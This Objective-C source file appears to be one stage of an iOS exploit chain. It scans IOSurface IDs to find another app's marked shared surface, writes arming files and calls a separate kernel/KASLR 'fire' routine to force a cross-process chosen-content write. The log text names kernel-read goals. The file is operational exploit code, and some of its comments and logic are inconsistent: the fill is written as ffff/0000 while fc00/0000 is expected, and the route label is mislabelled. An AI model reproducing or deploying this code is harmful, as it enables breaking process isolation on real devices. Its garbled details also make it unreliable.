//
//  P188AutoCrossFire.m — the cross-process auto-aim: find the MAIN APP's
// held surface BY ITS MARKER, derive the sid, fire — all in one tap.
//
//  THE TWO ROUTES (both end at the same fire):
//    ROUTE A (the direct, preferred): the P187 holder fills its ENTIRE
//    16KB surface with the alternating fp16 marker 3c00/4000. P188 scans
//    IOSurfaceLookup(1..4096) in the DEBUGGER's task for a 16KB surface
//    whose content matches that marker EXACTLY. A hit IS the note-126
//    answer (cross-task resolution WORKS) AND the sid, derived with no
//    file at all.
//    ROUTE B (the mediated fallback): if no marker hit resolves (the
//    task-scoped law wins), P188 falls back to a pushed sid file
//    (p187_sid.txt's content pushed via USB, or p044_target.txt set
//    directly). No file = the honest hold.
//
//  THE FLOW:
//    1. (MAIN APP)   tap p187  -> HOLD (the marker surface, the sid
//                       printed + p187_sid.txt written). Keep alive.
//    2. (DEBUGGER)   tap p188  -> the marker scan -> auto-arm ->
//                       the P044 fire (the P186 pattern: model/req_in/
//                       fill written automatically, same tap).
//    3. (MAIN APP)   tap p187 again -> OBSERVE: foreign content =
//                       THE CROSS-PROCESS CHOSEN-CONTENT WRITE receipt.
//
//  The fill: finite fp16 tiles (3c00/4000 alternating — byte-exact by
//  the fp16 law, and DISTINCT from the holder's marker is impossible
//  here, so the firer's zebra uses ffff/0000: if it lands, the observe
//  diff shows fc00/0000 words — unmistakably NOT the holder's 3c00/4000).
//
//  PANIC-FREE (in-bounds fire). NEVER sets hasKread.
//  Log p188_auto_cross_log.txt.
//

#import "P188AutoCrossFire.h"
#import "P044AksKaslrReach.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <string.h>
#import <unistd.h>

#define P188_BUILD @"p188-auto-cross-fire-v1"
#define P188_SWEEP_MAX 4096

typedef void *(*p188_create_t)(CFDictionaryRef);
typedef uint32_t (*p188_getid_t)(IOSurfaceRef);
typedef size_t (*p188_allocsz_t)(IOSurfaceRef);
typedef IOSurfaceRef (*p188_lookup_t)(uint32_t);
typedef int (*p188_lock_t)(IOSurfaceRef, int, void *);
typedef void *(*p188_base_t)(IOSurfaceRef);

/* the P187 holder marker law: the whole surface alternates
   0x3c00 (fp16 1.0) / 0x4000 (fp16 2.0) as u16 words */
static int p188_is_holder_marker(const uint16_t *w, int n) {
    for (int q = 0; q < n; q++) {
        uint16_t want = (q & 1) ? 0x4000 : 0x3c00;
        if (w[q] != want) return 0;
    }
    return 1;
}

@implementation P188AutoCrossFire

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    int fd = open([[docs stringByAppendingPathComponent:
                    @"p188_auto_cross_log.txt"] UTF8String],
                  O_CREAT | O_WRONLY | O_TRUNC, 0644);
    void (^L)(NSString *) = ^(NSString *s) {
        NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
        [log appendString:out];
        if (fd >= 0) { const char *p = out.UTF8String; if (p) write(fd, p, strlen(p)); }
    };

    L([NSString stringWithFormat:@"=== p188 session %@ BUILD %@ ===",
       LabLocalMilitaryNow() ?: @"?", P188_BUILD]);
    L(@"THE CROSS-PROCESS AUTO-AIM: scan for the MAIN APP's held surface");
    L(@"BY ITS MARKER (3c00/4000 alternating — unforgeable), derive the");
    L(@"sid, fire. A marker hit = the note-126 cross-task answer AND the");
    L(@"target in one step. No hit = the mediated fallback (a pushed sid");
    L(@"file) or the honest hold. PANIC-FREE. NEVER sets hasKread.");
    L([LabDeviceProfile identBlock] ?: @"ident=?");

    void *isf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    p188_lookup_t sfLookup = (p188_lookup_t)dlsym(isf, "IOSurfaceLookup");
    p188_allocsz_t sfAlloc  = (p188_allocsz_t)dlsym(isf, "IOSurfaceGetAllocSize");
    p188_lock_t   sfLock    = (p188_lock_t)dlsym(isf, "IOSurfaceLock");
    p188_base_t   sfBase    = (p188_base_t)dlsym(isf, "IOSurfaceGetBaseAddress");
    p188_getid_t  sfGetID   = (p188_getid_t)dlsym(isf, "IOSurfaceGetID");
    if (!sfLookup || !sfAlloc || !sfLock || !sfBase || !sfGetID) {
        L(@"[-] IOSurface symbols unresolved -- tap void");
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }

    /* ── ROUTE A: the marker scan ── */
    L(@"");
    L(@"=== ROUTE A: the holder-marker scan (the note-126 test) ===");
    uint32_t target = 0;
    int markerHits = 0;
    for (uint32_t sid = 1; sid < P188_SWEEP_MAX; sid++) {
        IOSurfaceRef f = sfLookup(sid);
        if (!f) continue;
        size_t sz = sfAlloc(f);
        if (sz != 16384) { CFRelease(f); continue; }
        int hit = 0;
        if (sfLock(f, 1, NULL) == 0) {
            uint16_t *w = (uint16_t *)sfBase(f);
            if (w && p188_is_holder_marker(w, 128)) {      /* the first 128 words */
                hit = 1;
                /* verify the WHOLE surface for certainty */
                if (p188_is_holder_marker(w, 8192)) hit = 2;
            }
            sfLock(f, 0, NULL);
        }
        CFRelease(f);
        if (hit) {
            markerHits++;
            if (!target) target = sid;
            L([NSString stringWithFormat:
               @"[A] *** MARKER HIT sid=%u (first128=%d full8192=%d) — "
               @"THE MAIN APP'S HELD SURFACE RESOLVES CROSS-TASK ***",
               sid, hit == 1 ? 1 : 0, hit == 2 ? 1 : 0]);
        }
    }
    L([NSString stringWithFormat:
       @"[A] scan done: %d marker surfaces resolved in THIS task",
       markerHits]);

    if (markerHits > 0) {
        L(@"[A] *** NOTE-126 ANSWER: CROSS-TASK IOSurfaceLookup RESOLUTION "
          @"WORKS — the debugger sees the main app's held surface. ***");
    }

    /* ── ROUTE B: the mediated fallback (a pushed sid file) ── */
    if (!target) {
        L(@"");
        L(@"=== ROUTE B: the mediated fallback (a pushed sid file) ===");
        L(@"[B] no marker surface resolved cross-task — the task-scoped law");
        L(@"    may hold (the note-126 answer is NO via lookup). Push the");
        L(@"    holder's sid (from the MAIN APP's Documents/p187_sid.txt,");
        L(@"    pulled via USB) into THIS app's Documents/p044_target.txt,");
        L(@"    then tap p188 again.");
        NSString *t = [docs stringByAppendingPathComponent:@"p044_target.txt"];
        NSString *cnt = [NSString stringWithContentsOfFile:t
                       encoding:NSUTF8StringEncoding error:NULL];
        if (cnt.length > 0) {
            target = (uint32_t)[cnt integerValue];
            L([NSString stringWithFormat:
               @"[B] p044_target.txt present: sid=%u (the mediated route — "
               @"the FIRE aims at it; the cross-task answer stays NO via "
               @"lookup)", target]);
        } else {
            L(@"[B] no sid file — the lane HOLDS honestly.");
            L(@"[=] NEVER hasKread.");
            if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
            return log;
        }
    }

    /* ── THE AUTO-ARM + THE FIRE (the P186 pattern) ── */
    L(@"");
    L([NSString stringWithFormat:@"=== AUTO-ARM + FIRE (target via %@) ===",
       target ? @"A" : @"B"]);
    {
        NSString *t = [docs stringByAppendingPathComponent:@"p044_target.txt"];
        NSString *m = [docs stringByAppendingPathComponent:@"p044_model.txt"];
        NSString *r = [docs stringByAppendingPathComponent:@"p044_req_in.txt"];
        NSString *f = [docs stringByAppendingPathComponent:@"p044_fill.txt"];
        [[NSString stringWithFormat:@"%u", target]
            writeToFile:t atomically:YES encoding:NSUTF8StringEncoding error:NULL];
        [@"XVRC27_127in_copyout"
            writeToFile:m atomically:YES encoding:NSUTF8StringEncoding error:NULL];
        [@"127"
            writeToFile:r atomically:YES encoding:NSUTF8StringEncoding error:NULL];
        NSMutableString *zebra = [NSMutableString string];
        for (int i = 0; i < 127; i++)
            [zebra appendFormat:@"%@%@", (i ? @"," : @""),
             (i & 1) ? @"0000" : @"ffff"];
        [zebra writeToFile:f atomically:YES encoding:NSUTF8StringEncoding error:NULL];
        L([NSString stringWithFormat:@"[arm] p044_target.txt=%u", target]);
        L(@"[arm] model=XVRC27_127in_copyout req_in=127 fill=zebra(ffff/0000)");
        L(@"[arm] the zebra is DELIBERATELY not the holder's 3c00/4000: any");
        L(@"[arm] landed fc00/0000 words in the OBSERVE diff are unmistakably");
        L(@"[arm] the FIRE's, not the holder's own marker.");
        L(@"[arm] invoking the P044 fire NOW...");
    }
    NSString *p044log = [P044AksKaslrReach tap];
    L(@"");
    L(@"=== THE P044 FIRE LOG (verbatim) ===");
    L(p044log ?: @"(p044 tap returned nil)");

    L(@"");
    L(@"=== VERDICT ===");
    L([NSString stringWithFormat:
       @"[p188] marker-resolved=%d target=%u. NOW: in the MAIN APP tap "
       @"p187 again (OBSERVE). Foreign fc00/0000 words in the diff = THE "
       @"CROSS-PROCESS CHOSEN-CONTENT WRITE receipt. NEVER hasKread.",
       markerHits, target]);
    if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
    return log;
}

@end
